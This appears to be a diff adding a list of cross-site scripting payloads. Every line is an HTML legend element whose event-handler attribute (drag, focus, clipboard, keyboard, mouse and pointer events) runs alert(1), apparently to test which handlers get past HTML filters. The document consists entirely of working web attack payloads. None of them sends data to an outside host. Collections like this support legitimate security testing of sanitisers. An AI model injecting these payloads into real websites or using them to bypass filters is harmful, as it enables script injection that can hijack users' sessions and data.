@@ -1,0 +1,43 @@
+<legend draggable="true" ondrag="alert(1)">test</legend>
+<legend draggable="true" ondragend="alert(1)">test</legend>
+<legend draggable="true" ondragenter="alert(1)">test</legend>
+<legend draggable="true" ondragleave="alert(1)">test</legend>
+<legend draggable="true" ondragstart="alert(1)">test</legend>
+<legend id=x tabindex=1 onactivate=alert(1)></legend>
+<legend id=x tabindex=1 onbeforeactivate=alert(1)></legend>
+<legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>
+<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>
+<legend id=x tabindex=1 onfocus=alert(1)></legend>
+<legend id=x tabindex=1 onfocusin=alert(1)></legend>
+<legend onafterscriptexecute=alert(1)><script>1</script>
+<legend onbeforecopy="alert(1)" contenteditable>test</legend>
+<legend onbeforecut="alert(1)" contenteditable>test</legend>
+<legend onbeforepaste="alert(1)" contenteditable>test</legend>
+<legend onbeforescriptexecute=alert(1)><script>1</script>
+<legend onblur=alert(1) tabindex=1 id=x></legend><input autofocus>
+<legend onclick="alert(1)">test</legend>
+<legend oncontextmenu="alert(1)">test</legend>
+<legend oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<legend oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<legend ondblclick="alert(1)" autofocus tabindex=1>test</legend>
+<legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>
+<legend onkeydown="alert(1)" contenteditable>test</legend>
+<legend onkeypress="alert(1)" contenteditable>test</legend>
+<legend onkeyup="alert(1)" contenteditable>test</legend>
+<legend onmousedown="alert(1)">test</legend>
+<legend onmouseenter="alert(1)">test</legend>
+<legend onmouseleave="alert(1)">test</legend>
+<legend onmousemove="alert(1)">test</legend>
+<legend onmouseout="alert(1)">test</legend>
+<legend onmouseover="alert(1)">test</legend>
+<legend onmouseup="alert(1)">test</legend>
+<legend onmousewheel=alert(1)>requires scrolling
+<legend onpaste="alert(1)" contenteditable>test</legend>
+<legend onpointerdown=alert(1)>XSS</legend>
+<legend onpointerenter=alert(1)>XSS</legend>
+<legend onpointerleave=alert(1)>XSS</legend>
+<legend onpointermove=alert(1)>XSS</legend>
+<legend onpointerout=alert(1)>XSS</legend>
+<legend onpointerover=alert(1)>XSS</legend>
+<legend onpointerrawupdate=alert(1)>XSS</legend>
+<legend onpointerup=alert(1)>XSS</legend>
